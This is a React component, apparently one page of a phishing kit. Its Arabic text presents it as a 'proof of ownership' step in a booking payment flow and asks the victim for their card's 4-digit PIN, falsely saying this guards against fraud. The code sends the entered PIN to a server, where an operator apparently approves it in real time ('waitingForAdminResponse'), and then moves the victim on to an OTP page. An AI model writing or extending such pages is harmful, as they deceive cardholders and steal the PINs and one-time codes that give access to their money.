import Main from "@/components/MainWrapper";
import { Link, useLocation } from "react-router-dom";
import { useEffect, useState } from "react";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import { InputOTPControlled } from "@/components/InputOTPControlled";
import { cn } from "@/lib/utils";

const PIN = () => {
  const { state } = useLocation();
  useEffect(() => {
    setCurrentPage("PIN");
  }, []);

  const goNext = (e: any) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));

    sendDataToServer({
      data: {
        pin: data.pin,
      },
      current: "PIN",
      nextPage: "otp",
      waitingForAdminResponse: true,
    });
  };

  const [pin, setPin] = useState("");

  const isNotValid = pin.length > 0 && pin.length < 4;
  return (
    <Main>
      <main className="bg-gray-100 py-10">
        <div className="bg-white container mx-auto px-4 py-6 rounded-xl max-w-lg">
          <div className="flex flex-col items-center gap-2">
            <img
              src="\assets\images\pin-lock.png"
              className="h-24 mix-blend-darken"
              alt="pin lock image"
            />

            <h2 className="text-xl font-bold text-main">إثبات ملكية</h2>
            <p className="text-gray-600 text-center">
              الرجاء إدخخال الرمز السري الخاص بالبطاقة الخاص بك المكون من 4
              أرقام ليتم التأكد من ملكية وأهلية البطاقة للحماية من مخاطر
              الإحتيال الإلكتروني والانتقال إلي الحجز بمصداقية الطلب.
            </p>
          </div>

          <form
            onSubmit={goNext}
            className="mt-5 w-full flex flex-col items-center gap-6"
          >
            <div className="col-span-6">
              <InputOTPControlled id="pin" value={pin} setValue={setPin} />

              <p
                className={cn(
                  "text-red-500 text-sm text-center h-4 opacity-0 transition-opacity duration-300",
                  isNotValid && "opacity-100"
                )}
              >
                ادخل رمز سري صحيح
              </p>
            </div>

            <div className="flex flex-col lg:flex-row w-full gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                type="submit"
                disabled={isNotValid}
              >
                تأكيد
              </button>
              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/payment-gateway"}
                state={state}
              >
                السابق
              </Link>
            </div>
          </form>
        </div>
      </main>
    </Main>
  );
};
export default PIN;
